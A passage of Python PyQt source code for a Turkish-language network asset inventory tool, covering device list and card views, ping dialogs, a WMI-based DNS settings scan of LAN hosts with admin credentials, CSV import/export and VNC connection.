            cols = self.get_card_columns()
            count = self.devices.index(device) + 1
            self.cards_grid.addWidget(card, (count-1)//cols, (count-1)%cols)
    def add_table_row(self,d):
        row=self.table.rowCount();self.table.insertRow(row)
        try:
            _p=[int(x) for x in d.ip.split('.')];_s=_p[0]*16777216+_p[1]*65536+_p[2]*256+_p[3]
        except Exception:
            _s=0
        _ip_it=NumericSortItem(d.ip,_s);self.table.setItem(row,0,_ip_it)
        name_item=QTableWidgetItem(d.asset_name or "-")
        if d.asset_name:
            try:name_item.setForeground(QColor(ASSET_CONFIG[AssetType(d.asset_type)]['color']))
            except:name_item.setForeground(QColor("#00ff88"))
        self.table.setItem(row,1,name_item)
        type_name=""
        if d.asset_type:
            try:type_name=ASSET_CONFIG[AssetType(d.asset_type)]['name']
            except:pass
        self.table.setItem(row,2,QTableWidgetItem(type_name));self.table.setItem(row,3,QTableWidgetItem(d.department_name or "-"));self.table.setItem(row,4,QTableWidgetItem(d.location or "-"))
        self.table.setItem(row,5,QTableWidgetItem(d.hostname or d.netbios_name or "-"));self.table.setItem(row,6,QTableWidgetItem(d.mac or "-"));self.table.setItem(row,7,QTableWidgetItem(f"{d.response_time:.0f}ms" if d.response_time else "-"))
        self.table.setItem(row,8,QTableWidgetItem("🟢" if d.status=="online" else "🔴"));vnc_item=QTableWidgetItem("✅" if d.vnc_available else "-");self.table.setItem(row,9,vnc_item)
    def add_card(self,device):
        card=DeviceCardWidget(device);card.setFixedWidth(getattr(self,'card_width',180));card.clicked.connect(self.show_device_details);card.vnc_connect.connect(self.connect_vnc);card.assign_asset.connect(self.quick_assign_asset);card.edit_asset.connect(self.edit_device_asset)
        cols=self.get_card_columns();count=len(self.devices);self.cards_grid.addWidget(card,(count-1)//cols,(count-1)%cols)
        # Cihaz sayısını güncelle
        try:self.device_count_label.setText(f"{len(self.devices)} cihaz")
        except:pass
    def get_card_columns(self):
        try:
            w=self.cards_widget.parent().width() if self.cards_widget.parent() else 800
            card_w=getattr(self,'card_width',180)
            return max(2,min(8,(w-20)//(card_w+10)))
        except:return 5
    
    def switch_device_view(self, index):
        """Kart/Liste görünümü değiştir"""
        self.device_view_stack.setCurrentIndex(index)
        active_style = "QPushButton{background:#00ff88;color:#0a0a14;padding:6px 12px;border-radius:4px;font-weight:bold;}"
        inactive_style = "QPushButton{background:#0f3460;color:white;padding:6px 12px;border-radius:4px;}"
        
        if index == 0:
            self.card_view_btn.setStyleSheet(active_style)
            self.list_view_btn.setStyleSheet(inactive_style)
            self.card_size_combo.setEnabled(True)
        else:
            self.card_view_btn.setStyleSheet(inactive_style)
            self.list_view_btn.setStyleSheet(active_style)
            self.card_size_combo.setEnabled(False)
            self.update_device_table()
    
    def update_device_table(self):
        """Cihaz tablosunu güncelle"""
        search = self.device_search.text().lower().strip()
        filtered = self.devices
        dept_id = self.dept_filter.currentData()
        type_filter = self.type_filter.currentData()
        status_idx = self.status_filter.currentIndex()
        match_idx = self.match_filter.currentIndex()
        
        if dept_id: filtered = [d for d in filtered if d.department_id == dept_id]
        if type_filter: filtered = [d for d in filtered if d.asset_type == type_filter]
        if status_idx == 1: filtered = [d for d in filtered if d.status == "online"]
        elif status_idx == 2: filtered = [d for d in filtered if d.status == "offline"]
        elif status_idx == 3: filtered = [d for d in filtered if d.vnc_available]
        elif status_idx == 4: filtered = [d for d in filtered if d.is_critical]
        if match_idx == 1: filtered = [d for d in filtered if d.asset_name]
        elif match_idx == 2: filtered = [d for d in filtered if not d.asset_name]
        
        if search:
            filtered = [d for d in filtered if 
                search in d.ip.lower() or 
                search in (d.hostname or '').lower() or 
                search in (d.netbios_name or '').lower() or 
                search in (d.asset_name or '').lower() or
                search in (d.department_name or '').lower() or
                search in (d.dns_servers or '').lower()]
        
        self.device_table.setSortingEnabled(False)
        self.device_table.setRowCount(len(filtered))
        
        for row, d in enumerate(filtered):
            if d.status == "online":
                status_item = QTableWidgetItem("🟢 Online")
                status_item.setForeground(QColor("#00ff88"))
            else:
                status_item = QTableWidgetItem("🔴 Offline")
                status_item.setForeground(QColor("#e74c3c"))
            status_item.setData(Qt.ItemDataRole.UserRole, d.ip)
            self.device_table.setItem(row, 0, status_item)
            
            hostname = d.hostname or d.netbios_name or "-"
            host_item = QTableWidgetItem(hostname)
            host_item.setForeground(QColor("#00d4ff"))
            self.device_table.setItem(row, 1, host_item)
            
            try:
                _p = [int(x) for x in d.ip.split('.')]
                _ip_sort = _p[0]*16777216 + _p[1]*65536 + _p[2]*256 + _p[3]
            except Exception:
                _ip_sort = 0
            ip_item = NumericSortItem(d.ip, _ip_sort)
            ip_item.setForeground(QColor("#f39c12"))
            self.device_table.setItem(row, 2, ip_item)
            
            self.device_table.setItem(row, 3, QTableWidgetItem(d.vendor or "-"))
            self.device_table.setItem(row, 4, QTableWidgetItem(d.mac or "-"))
            
            # DNS
            dns_item = QTableWidgetItem(d.dns_servers or "-")
            if d.dns_servers: dns_item.setForeground(QColor("#3498db"))
            else: dns_item.setForeground(QColor("#666"))
            self.device_table.setItem(row, 5, dns_item)
            
            ports = ", ".join(map(str, d.open_ports[:5])) if d.open_ports else "-"
            if len(d.open_ports) > 5: ports += "..."
            self.device_table.setItem(row, 6, QTableWidgetItem(ports))
            
            asset_item = QTableWidgetItem(d.asset_name or "-")
            if d.asset_name: asset_item.setForeground(QColor("#00ff88"))
            else: asset_item.setForeground(QColor("#666"))
            self.device_table.setItem(row, 7, asset_item)
            
            dept_item = QTableWidgetItem(d.department_name or "-")
            if d.department_name: dept_item.setForeground(QColor("#9b59b6"))
            self.device_table.setItem(row, 8, dept_item)
        
        self.device_table.setSortingEnabled(True)
    
    def show_device_table_context_menu(self, pos):
        """Cihaz tablosu sağ tık menüsü"""
        row = self.device_table.rowAt(pos.y())
        if row < 0: return
        item = self.device_table.item(row, 0)
        if not item: return
        ip = item.data(Qt.ItemDataRole.UserRole)
        device = next((d for d in self.devices if d.ip == ip), None)
        if not device: return
        
        menu = QMenu(self)
        menu.setStyleSheet("QMenu{background:#16213e;color:white;border:1px solid #0f3460;}QMenu::item:selected{background:#0f3460;}")
        
        if device.vnc_available:
            menu.addAction("🖥️ VNC Bağlan").triggered.connect(lambda: self.connect_vnc(device))
        menu.addAction("📋 IP Kopyala").triggered.connect(lambda: QApplication.clipboard().setText(device.ip))
        menu.addAction("📋 MAC Kopyala").triggered.connect(lambda: QApplication.clipboard().setText(device.mac or ""))
        menu.addSeparator()
        menu.addAction("🔍 Detaylar").triggered.connect(lambda: self.show_device_details(device))
        menu.addAction("📡 Ping").triggered.connect(lambda: self.ping_single_device(device.ip))
        menu.addAction("🔄 Sürekli Ping").triggered.connect(lambda: self.ping_continuous(device.ip))
        menu.addSeparator()
        
        if device.asset_name:
            menu.addAction("✏️ Varlığı Düzenle").triggered.connect(lambda: self.edit_device_asset(device))
        else:
            assign_menu = menu.addMenu("➕ Varlığa Ata")
            for asset in self.org.get_assets()[:15]:
                action = assign_menu.addAction(f"{asset.name}")
                action.triggered.connect(lambda checked, a=asset: self.quick_assign_asset(device, a.id))
        
        menu.exec(self.device_table.viewport().mapToGlobal(pos))
    
    def device_table_double_click(self, index):
        """Tablo çift tıklama"""
        row = index.row()
        item = self.device_table.item(row, 0)
        if not item: return
        ip = item.data(Qt.ItemDataRole.UserRole)
        device = next((d for d in self.devices if d.ip == ip), None)
        if not device: return
        if device.vnc_available: self.connect_vnc(device)
        else: self.show_device_details(device)
    
    def ping_single_device(self, ip):
        """4 ping at, sonuçları göster"""
        try:
            if platform.system() == "Windows":
                cmd = ["ping", "-n", "4", "-w", "1000", ip]
            else:
                cmd = ["ping", "-c", "4", "-W", "1", ip]
            result = run_command(cmd, timeout=10)
            if result.returncode == 0:
                QMessageBox.information(self, "Ping Sonucu", f"✅ {ip} erişilebilir!\n\n{result.stdout}")
            else:
                QMessageBox.warning(self, "Ping Sonucu", f"❌ {ip} erişilemiyor!\n\n{result.stdout or result.stderr}")
        except Exception as e:
            QMessageBox.critical(self, "Hata", f"Ping hatası: {e}")
    
    def ping_continuous(self, ip):
        """Sürekli ping dialog — durdurulana kadar ping atar, sonuçları canlı gösterir."""
        dlg = QDialog(self)
        dlg.setWindowTitle(f"🔄 Sürekli Ping — {ip}")
        dlg.setMinimumSize(500, 420)
        dlg.setStyleSheet(
            "QDialog{background:#0a0a14;}"
            "QLabel{color:#00d4ff;font-weight:bold;}"
            "QPushButton{background:#16213e;color:#00ff88;border:1px solid #0f3460;"
            "padding:6px 16px;border-radius:4px;font-size:12px;}"
            "QPushButton:hover{background:#0f3460;}"
            "QPushButton#stop{background:#3d0a0a;color:#e74c3c;border-color:#e74c3c;}"
            "QPushButton#stop:hover{background:#e74c3c;color:white;}"
            "QTextEdit{background:#0d1117;color:#c9d1d9;border:1px solid #0f3460;"
            "font-family:Consolas,monospace;font-size:11px;}"
        )
        layout = QVBoxLayout(dlg)
        layout.setSpacing(8)

        # Başlık + istatistik satırı
        title = QLabel(f"📡 {ip} adresine sürekli ping")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)

        stat_row = QHBoxLayout()
        lbl_sent     = QLabel("Gönderilen: 0")
        lbl_recv     = QLabel("Alınan: 0")
        lbl_lost     = QLabel("Kayıp: %0")
        lbl_avg      = QLabel("Ort: — ms")
        lbl_sent.setStyleSheet("color:#888;font-weight:normal;")
        lbl_recv.setStyleSheet("color:#00ff88;font-weight:normal;")
        lbl_lost.setStyleSheet("color:#e74c3c;font-weight:normal;")
        lbl_avg .setStyleSheet("color:#f1c40f;font-weight:normal;")
        for w in (lbl_sent, lbl_recv, lbl_lost, lbl_avg):
            stat_row.addWidget(w)
        layout.addLayout(stat_row)

        # Log alanı
        log = QTextEdit()
        log.setReadOnly(True)
        layout.addWidget(log)

        # Butonlar
        btn_row = QHBoxLayout()
        btn_clear = QPushButton("🗑️ Temizle")
        btn_copy  = QPushButton("📋 Kopyala")
        btn_stop  = QPushButton("⏹ Durdur")
        btn_stop.setObjectName("stop")
        btn_row.addWidget(btn_clear)
        btn_row.addWidget(btn_copy)
        btn_row.addStretch()
        btn_row.addWidget(btn_stop)
        layout.addLayout(btn_row)

        # İstatistik sayaçları
        stats = {"sent": 0, "recv": 0, "times": []}

        def append(line, color="#c9d1d9"):
            log.append(f'<span style="color:{color}">{line}</span>')
            sb = log.verticalScrollBar()
            sb.setValue(sb.maximum())

        def update_stats():
            s = stats["sent"]; r = stats["recv"]; lost = s - r
            pct = (lost / s * 100) if s else 0
            avg = (sum(stats["times"]) / len(stats["times"])) if stats["times"] else 0
            lbl_sent.setText(f"Gönderilen: {s}")
            lbl_recv.setText(f"Alınan: {r}")
            lbl_lost.setText(f"Kayıp: %{pct:.0f}")
            lbl_avg .setText(f"Ort: {avg:.1f} ms" if avg else "Ort: — ms")

        # Thread
        class PingThread(QThread):
            line_ready = pyqtSignal(str, str)   # text, color
            stats_ready = pyqtSignal(bool, float)  # success, ms

            def __init__(self, ip):
                super().__init__()
                self.ip   = ip
                self._run = True

            def stop(self):
                self._run = False

            def run(self):
                seq = 0
                while self._run:
                    seq += 1
                    ts = datetime.now().strftime("%H:%M:%S")
                    t0 = time.perf_counter()
                    if platform.system() == "Windows":
                        cmd = ["ping", "-n", "1", "-w", "1000", self.ip]
                    else:
                        cmd = ["ping", "-c", "1", "-W", "1", self.ip]
                    try:
                        res = run_command(cmd, timeout=3)
                        ms  = (time.perf_counter() - t0) * 1000
                        ok  = res.returncode == 0
                        # Gerçek RTT'yi stdout'tan çek
                        import re as _re
                        m = _re.search(r'[Tt]ime[<=](\d+)', res.stdout)
                        rtt = float(m.group(1)) if m else ms
                    except Exception:
                        ok  = False
                        rtt = 0
                    self.stats_ready.emit(ok, rtt)
                    if ok:
                        self.line_ready.emit(
                            f"[{ts}] #{seq}  {self.ip}  {rtt:.0f} ms  ✅", "#00ff88")
                    else:
                        self.line_ready.emit(
                            f"[{ts}] #{seq}  {self.ip}  zaman aşımı  ❌", "#e74c3c")
                    self.msleep(1000)

        thread = PingThread(ip)

        def on_line(text, color):
            append(text, color)

        def on_stats(ok, ms):
            stats["sent"] += 1
            if ok:
                stats["recv"] += 1
                stats["times"].append(ms)
                if len(stats["times"]) > 200:
                    stats["times"].pop(0)
            update_stats()

        thread.line_ready .connect(on_line)
        thread.stats_ready.connect(on_stats)

        btn_clear.clicked.connect(log.clear)
        btn_copy .clicked.connect(lambda: QApplication.clipboard().setText(log.toPlainText()))
        btn_stop .clicked.connect(lambda: (thread.stop(), btn_stop.setEnabled(False),
                                           btn_stop.setText("⏹ Durduruldu")))

        def on_close():
            thread.stop()
            thread.wait(2000)

        dlg.finished.connect(on_close)

        append(f"Sürekli ping başlatıldı → {ip}", "#00d4ff")
        thread.start()
        dlg.exec()

    def scan_dns_servers(self):
        """Online cihazların DNS ayarlarını tara"""
        online_devices = [d for d in self.devices if d.status == "online"]
        if not online_devices:
            QMessageBox.warning(self, "Uyarı", "Taranacak online cihaz bulunamadı!\nÖnce ağ taraması yapın.")
            return
        
        # Kimlik bilgisi dialogu
        cred_dialog = QDialog(self)
        cred_dialog.setWindowTitle("🔐 DNS Tarama - Kimlik Bilgileri")
        cred_dialog.setMinimumWidth(400)
        cred_dialog.setStyleSheet("QDialog{background:#0a0a14;}QLabel{color:white;}QLineEdit{background:#16213e;color:white;border:1px solid #0f3460;padding:8px;border-radius:4px;}")
        layout = QVBoxLayout(cred_dialog)
        layout.addWidget(QLabel("Uzak bilgisayarlara erişim için domain admin bilgileri:"))
        layout.addWidget(QLabel(""))
        layout.addWidget(QLabel("Kullanıcı Adı (DOMAIN\\kullanici):"))
        user_edit = QLineEdit();user_edit.setPlaceholderText("MERKEZ\\administrator veya administrator");layout.addWidget(user_edit)
        layout.addWidget(QLabel("Şifre:"))
        pass_edit = QLineEdit();pass_edit.setEchoMode(QLineEdit.EchoMode.Password);layout.addWidget(pass_edit)
        anon_check = QCheckBox("Kimlik bilgisi olmadan dene (sadece aynı domain)");anon_check.setStyleSheet("QCheckBox{color:#888;}")
        anon_check.stateChanged.connect(lambda s: (user_edit.setEnabled(s==0), pass_edit.setEnabled(s==0)));layout.addWidget(anon_check)
        layout.addWidget(QLabel(""))
        btn_layout = QHBoxLayout()
        ok_btn = QPushButton("🔍 Tara");ok_btn.setStyleSheet("QPushButton{background:#3498db;color:white;padding:10px 20px;border-radius:4px;font-weight:bold;}");ok_btn.clicked.connect(cred_dialog.accept)
        cancel_btn = QPushButton("İptal");cancel_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;padding:10px 20px;border-radius:4px;}");cancel_btn.clicked.connect(cred_dialog.reject)
        btn_layout.addWidget(ok_btn);btn_layout.addWidget(cancel_btn);layout.addLayout(btn_layout)
        
        if cred_dialog.exec() != QDialog.DialogCode.Accepted: return
        username = user_edit.text().strip() if not anon_check.isChecked() else ""
        password = pass_edit.text() if not anon_check.isChecked() else ""
        
        progress = QProgressDialog(f"DNS taranıyor (0/{len(online_devices)})...", "İptal", 0, len(online_devices), self)
        progress.setWindowTitle("🌐 DNS Tarama");progress.setWindowModality(Qt.WindowModality.WindowModal)
        progress.setStyleSheet("QProgressDialog{background:#0a0a14;color:white;}QProgressBar{background:#16213e;border:1px solid #0f3460;}QProgressBar::chunk{background:#3498db;}")
        progress.show()
        
        dns_found = 0;dns_list = {};errors = 0
        for i, device in enumerate(online_devices):
            if progress.wasCanceled(): break
            progress.setValue(i);progress.setLabelText(f"DNS taranıyor ({i+1}/{len(online_devices)})...\n{device.ip} - {device.hostname or 'Bilinmiyor'}");QApplication.processEvents()
            dns = self.get_device_dns(device.ip, username, password)
            if dns:
                device.dns_servers = dns;dns_found += 1
                for server in dns.split(", "):
                    if server not in dns_list: dns_list[server] = []
                    dns_list[server].append(device.hostname or device.ip)
            else: errors += 1
        
        progress.setValue(len(online_devices));progress.close()
        
        if dns_found > 0:
            if hasattr(self, 'device_view_stack') and self.device_view_stack.currentIndex() == 1: self.update_device_table()
            report = f"✅ {dns_found}/{len(online_devices)} cihazda DNS tespit edildi\n"
            if errors > 0: report += f"⚠️ {errors} cihaza erişilemedi\n"
            report += "\n📊 DNS Sunucu Dağılımı:\n" + "-" * 40 + "\n"
            for dns_server, devices in sorted(dns_list.items(), key=lambda x: -len(x[1])):
                report += f"\n🌐 {dns_server}\n   └─ {len(devices)} cihaz\n"
                for dev in devices[:5]: report += f"      • {dev}\n"
                if len(devices) > 5: report += f"      ... ve {len(devices)-5} cihaz daha\n"
            
            dialog = QDialog(self);dialog.setWindowTitle("🌐 DNS Tarama Sonuçları");dialog.setMinimumSize(500, 400)
            dialog.setStyleSheet("QDialog{background:#0a0a14;}QLabel{color:white;}QTextEdit{background:#16213e;color:white;border:1px solid #0f3460;}")
            layout = QVBoxLayout(dialog);text = QTextEdit();text.setPlainText(report);text.setReadOnly(True);layout.addWidget(text)
            btn_layout = QHBoxLayout()
            copy_btn = QPushButton("📋 Kopyala");copy_btn.clicked.connect(lambda: QApplication.clipboard().setText(report));copy_btn.setStyleSheet("QPushButton{background:#3498db;color:white;padding:8px 16px;border-radius:4px;}");btn_layout.addWidget(copy_btn)
            export_btn = QPushButton("📥 CSV Kaydet");export_btn.clicked.connect(lambda: self.export_dns_csv(dns_list));export_btn.setStyleSheet("QPushButton{background:#27ae60;color:white;padding:8px 16px;border-radius:4px;}");btn_layout.addWidget(export_btn)
            close_btn = QPushButton("Kapat");close_btn.clicked.connect(dialog.close);close_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;padding:8px 16px;border-radius:4px;}");btn_layout.addWidget(close_btn)
            layout.addLayout(btn_layout);dialog.exec()
        else:
            QMessageBox.warning(self, "DNS Tarama", f"Hiçbir cihazda DNS bilgisi alınamadı.\n\n{errors} cihaza erişilemedi.\n\nOlası nedenler:\n• Yanlış kullanıcı adı/şifre\n• WMI/RPC erişimi kapalı\n• Firewall engelliyor\n• Admin yetkisi gerekli")
    
    def get_device_dns(self, ip, username="", password=""):
        """Tek cihazın DNS ayarlarını al"""
        try:
            if username and password:
                cmd = ['wmic', f'/node:{ip}', f'/user:{username}', f'/password:{password}', 'nicconfig', 'where', 'IPEnabled=True', 'get', 'DNSServerSearchOrder', '/format:list']
            else:
                cmd = ['wmic', f'/node:{ip}', 'nicconfig', 'where', 'IPEnabled=True', 'get', 'DNSServerSearchOrder', '/format:list']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
            if result.returncode == 0 and result.stdout:
                for line in result.stdout.split('\n'):
                    if 'DNSServerSearchOrder' in line and '=' in line:
                        dns_part = line.split('=', 1)[1].strip()
                        if dns_part and dns_part != '(null)': return dns_part.replace('{', '').replace('}', '').replace('"', '').strip()
        except: pass
        return ""
    
    def export_dns_csv(self, dns_list):
        """DNS listesini CSV olarak kaydet"""
        try:
            path, _ = QFileDialog.getSaveFileName(self, "DNS Listesi Kaydet", "dns_raporu.csv", "CSV (*.csv)")
            if not path: return
            with open(path, 'w', encoding='utf-8-sig') as f:
                f.write("DNS Sunucu,Cihaz Sayısı,Cihazlar\n")
                for dns_server, devices in sorted(dns_list.items(), key=lambda x: -len(x[1])):
                    f.write(f"{dns_server},{len(devices)},\"{'; '.join(devices)}\"\n")
            QMessageBox.information(self, "Başarılı", f"DNS raporu kaydedildi:\n{path}")
        except Exception as e: QMessageBox.critical(self, "Hata", f"Kayıt hatası: {e}")
    
    def import_dns_csv(self):
        """GPO scripti ile toplanan DNS CSV'sini içe aktar"""
        path, _ = QFileDialog.getOpenFileName(self, "DNS CSV Dosyası Seç", "", "CSV (*.csv);;Tüm Dosyalar (*)")
        if not path: return
        try:
            matched = 0; not_found = []
            with open(path, 'r', encoding='utf-8-sig') as f: lines = f.readlines()
            for line in lines[1:]:
                line = line.strip()
                if not line: continue
                parts = line.split(',')
                if len(parts) < 4: continue
                if len(parts) >= 5:
                    pc_name = parts[1].strip().upper(); ip = parts[3].strip(); dns = parts[4].strip().replace(';', ', ')
                else:
                    pc_name = parts[1].strip().upper(); ip = parts[2].strip(); dns = parts[3].strip().replace(';', ', ')
                found = False
                for device in self.devices:
                    device_hostname = (device.hostname or device.netbios_name or "").upper()
                    if device_hostname == pc_name or device.ip == ip:
                        device.dns_servers = dns; matched += 1; found = True; break
                if not found and pc_name: not_found.append(f"{pc_name} ({ip})")
            if hasattr(self, 'device_view_stack') and self.device_view_stack.currentIndex() == 1: self.update_device_table()
            msg = f"✅ {matched} cihaza DNS bilgisi eşleştirildi.\n"
            if not_found:
                msg += f"\n⚠️ {len(not_found)} cihaz bulunamadı"
                if len(not_found) <= 5: msg += ":\n" + "\n".join(not_found)
                else: msg += f" (ilk 5: {', '.join(not_found[:5])}...)"
            QMessageBox.information(self, "DNS Import", msg)
        except Exception as e: QMessageBox.critical(self, "Hata", f"CSV okuma hatası:\n{e}")
    
    def filter_device_cards(self,text):
        """Cihaz kartlarını filtrele - Arama + Sol panel filtreleri"""
        search=text.lower().strip()
        self.clear_cards()
        
        # Önce sol panel filtrelerini uygula
        filtered=self.devices
        dept_id=self.dept_filter.currentData()
        type_filter=self.type_filter.currentData()
        status_idx=self.status_filter.currentIndex()
        match_idx=self.match_filter.currentIndex()
        
        if dept_id:filtered=[d for d in filtered if d.department_id==dept_id]
        if type_filter:filtered=[d for d in filtered if d.asset_type==type_filter]
        if status_idx==1:filtered=[d for d in filtered if d.status=="online"]
        elif status_idx==2:filtered=[d for d in filtered if d.status=="offline"]
        elif status_idx==3:filtered=[d for d in filtered if d.vnc_available]
        elif status_idx==4:filtered=[d for d in filtered if d.is_critical]
        if match_idx==1:filtered=[d for d in filtered if d.asset_name]
        elif match_idx==2:filtered=[d for d in filtered if not d.asset_name]
        
        # Sonra arama filtresi
        if search:
            filtered=[d for d in filtered if 
                search in d.ip.lower() or 
                search in (d.hostname or '').lower() or 
                search in (d.netbios_name or '').lower() or 
                search in (d.asset_name or '').lower() or
                search in (d.department_name or '').lower()]
        
        cols=self.get_card_columns()
        for i,d in enumerate(filtered):
            card=DeviceCardWidget(d)
            card.setFixedWidth(self.card_width)
            card.clicked.connect(self.show_device_details)
            card.vnc_connect.connect(self.connect_vnc)
            card.assign_asset.connect(self.quick_assign_asset)
            card.edit_asset.connect(self.edit_device_asset)
            self.cards_grid.addWidget(card,i//cols,i%cols)
        
        self.device_count_label.setText(f"{len(filtered)} cihaz" + (f" (/{len(self.devices)})" if search or dept_id or type_filter or status_idx>0 or match_idx>0 else ""))
        
        # Liste görünümünü de güncelle
        if hasattr(self, 'device_view_stack') and self.device_view_stack.currentIndex() == 1:
            self.update_device_table()
    
    def change_card_size(self,index):
        """Kart boyutunu değiştir"""
        sizes=[150,180,220]  # Küçük, Normal, Büyük
        self.card_width=sizes[index]
        # Kartları yeniden oluştur
        self.filter_device_cards(self.device_search.text())
    
    def clear_cards(self):
        while self.cards_grid.count():item=self.cards_grid.takeAt(0);item.widget().deleteLater() if item.widget() else None
    def update_stats(self):
        total=len(self.devices);online=sum(1 for d in self.devices if d.status=="online");matched=sum(1 for d in self.devices if d.asset_name);critical=sum(1 for d in self.devices if d.is_critical and d.status=="online");vnc=sum(1 for d in self.devices if d.vnc_available)
        self.stats_labels['total'].setText(f"📊 {total}");self.stats_labels['online'].setText(f"🟢 {online}");self.stats_labels['matched'].setText(f"👥 {matched}");self.stats_labels['critical'].setText(f"⚠️ {critical}");self.stats_labels['vnc'].setText(f"🖥️ {vnc}")
    def show_table_context_menu(self,pos):
        row=self.table.rowAt(pos.y())
        if row<0:return
        ip=self.table.item(row,0).text() if self.table.item(row,0) else None
        if not ip:return
        device=next((d for d in self.devices if d.ip==ip),None)
        if not device:return
        menu=QMenu(self)
        menu.setStyleSheet("QMenu{background:#1a1a2e;color:white;border:1px solid #0f3460;border-radius:8px;padding:5px;}QMenu::item{padding:8px 20px;border-radius:4px;}QMenu::item:selected{background:#0f3460;}QMenu::separator{height:1px;background:#0f3460;margin:5px 10px;}")
        title=menu.addAction(f"📍 {device.ip}" + (f" - {device.asset_name}" if device.asset_name else ""));title.setEnabled(False);menu.addSeparator()
        if device.asset_id:edit_act=menu.addAction("✏️ Varlığı Düzenle");edit_act.triggered.connect(lambda:self.edit_device_asset(device))
        else:
            assign_menu=menu.addMenu("📋 Hızlı Varlık Ata")
            for atype in AssetType:cfg=ASSET_CONFIG[atype];act=assign_menu.addAction(f"{cfg['icon']} {cfg['name']}");act.triggered.connect(lambda c,t=atype.value:self.quick_assign_asset(device,t))
        menu.addSeparator()
        if device.vnc_available:vnc_act=menu.addAction("🖥️ VNC Bağlan");vnc_act.triggered.connect(lambda:self.connect_vnc(device));menu.addSeparator()
        copy_ip=menu.addAction("📋 IP Kopyala");copy_ip.triggered.connect(lambda:QApplication.clipboard().setText(device.ip))
        if device.mac:copy_mac=menu.addAction("📋 MAC Kopyala");copy_mac.triggered.connect(lambda:QApplication.clipboard().setText(device.mac))
        menu.addSeparator();details_act=menu.addAction("🔍 Detayları Göster");details_act.triggered.connect(lambda:self.show_device_details(device))
        menu.exec(self.table.viewport().mapToGlobal(pos))
    def apply_filters(self):
        """Sol panel filtreleri değiştiğinde"""
        # Arama kutusundaki metni de kullanarak filtrele
        self.filter_device_cards(self.device_search.text())
    def show_device_details(self,device):
        if not device:return
        info=f"<h2 style='color:#00ff88'>{device.ip}</h2>"
        if device.asset_name:
            try:cfg=ASSET_CONFIG[AssetType(device.asset_type)];info+=f"<p><b>{cfg['icon']} Varlık:</b> {device.asset_name}</p><p><b>Tür:</b> {cfg['name']}</p>"
            except:info+=f"<p><b>Varlık:</b> {device.asset_name}</p>"
        if device.department_name:info+=f"<p><b>🏢 Birim:</b> {device.department_name}</p>"
        if device.location:info+=f"<p><b>📍 Konum:</b> {device.location}</p>"
        if device.is_critical:info+=f"<p style='color:#ff6b6b'><b>⚠️ KRİTİK VARLIK</b></p>"
        info+=f"<hr><p><b>Durum:</b> {'🟢 Çevrimiçi' if device.status=='online' else '🔴 Çevrimdışı'}</p>"
        info+=f"<p><b>Tespit:</b> {device.detection_method}</p><p><b>Hostname:</b> {device.hostname or '-'}</p>"
        if device.netbios_name and device.netbios_name!=device.hostname:info+=f"<p><b>NetBIOS:</b> {device.netbios_name}</p>"
        info+=f"<p><b>MAC:</b> {device.mac or '-'}</p><p><b>Vendor:</b> {device.vendor or '-'}</p>"
        if device.response_time:info+=f"<p><b>Ping:</b> {device.response_time:.1f} ms</p>"
        info+=f"<p><b>VNC:</b> {'✅ Port '+str(device.vnc_port) if device.vnc_available else '❌'}</p>"
        if device.open_ports:info+=f"<p><b>Portlar:</b> {', '.join(str(p) for p in sorted(device.open_ports))}</p>"
        msg=QMessageBox(self);msg.setWindowTitle(f"Cihaz: {device.ip}");msg.setWindowIcon(create_app_icon());msg.setText(info)
        if device.vnc_available:msg.addButton("🖥️ VNC Bağlan",QMessageBox.ButtonRole.AcceptRole)
        msg.addButton("Kapat",QMessageBox.ButtonRole.RejectRole)
        if msg.exec()==0 and device.vnc_available:self.connect_vnc(device)
    def connect_vnc(self,device):
        ok,msg=self.vnc_manager.connect(device.ip,device.vnc_port);self.log(f"🖥️ VNC: {device.ip}:{device.vnc_port}") if ok else None;(QMessageBox.information if ok else QMessageBox.warning)(self,"VNC",msg)
    def quick_vnc(self):
        ip=self.quick_ip.text().strip()
        if ip:ok,msg=self.vnc_manager.connect(ip);self.log(f"🖥️ Hızlı VNC: {ip}") if ok else None;(QMessageBox.information if ok else QMessageBox.warning)(self,"VNC",msg)
    def export_csv(self):
        if not self.devices:return QMessageBox.warning(self,"Uyarı","Veri yok!")
        path,_=QFileDialog.getSaveFileName(self,"CSV Kaydet",f"motunnet_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv","CSV (*.csv)")
        if path:
            with open(path,'w',newline='',encoding='utf-8') as f:
                w=csv.writer(f);w.writerow(["IP","Varlık","Tür","Birim","Konum","Hostname","MAC","Vendor","Ping","Durum","VNC","Portlar","Kritik"])
                for d in self.devices:
                    tname=ASSET_CONFIG.get(AssetType(d.asset_type),{}).get('name','') if d.asset_type else ""
                    w.writerow([d.ip,d.asset_name,tname,d.department_name,d.location,d.hostname,d.mac,d.vendor,f"{d.response_time:.0f}" if d.response_time else "",d.status,"Evet" if d.vnc_available else "Hayır",",".join(str(p) for p in d.open_ports),"Evet" if d.is_critical else "Hayır"])
            self.log(f"📄 CSV: {path}");QMessageBox.information(self,"Başarılı",f"Kaydedildi:\n{path}")
    def quick_assign_asset(self,device,asset_type):
        if not self.org.get_departments():
            QMessageBox.warning(self,"Uyarı","Önce 'Varlık Yönetimi' sekmesinden bir birim eklemelisiniz!")
            self.tabs.setCurrentIndex(1);return
        dialog=QuickAssignDialog(device,asset_type,self.org,self)
        if dialog.exec()==QDialog.DialogCode.Accepted:
            data=dialog.get_data()
            if data['name'] and data['department_id']:
                asset=self.org.add_asset(**data)
                device.asset_id,device.asset_name,device.asset_type=asset.id,asset.name,asset.asset_type
                device.department_id=asset.department_id;device.department_name=self.org.departments.get(asset.department_id).name if asset.department_id in self.org.departments else ""
                device.location,device.is_critical=asset.location,asset.is_critical
                self.refresh_device_display(device);self.org_widget.refresh_all()
                cfg=ASSET_CONFIG.get(AssetType(asset_type),{});self.log(f"✅ Varlık eklendi: {cfg.get('icon','')} {asset.name} ({device.ip})")
                QMessageBox.information(self,"Başarılı",f"{cfg.get('icon','')} {asset.name} başarıyla eklendi!")
    def edit_device_asset(self,device):
        if not device.asset_id:return
        asset=self.org.assets.get(device.asset_id)
        if not asset:return
        dialog=AssetDialog(self,asset,self.org.get_departments())
        if dialog.exec()==QDialog.DialogCode.Accepted:
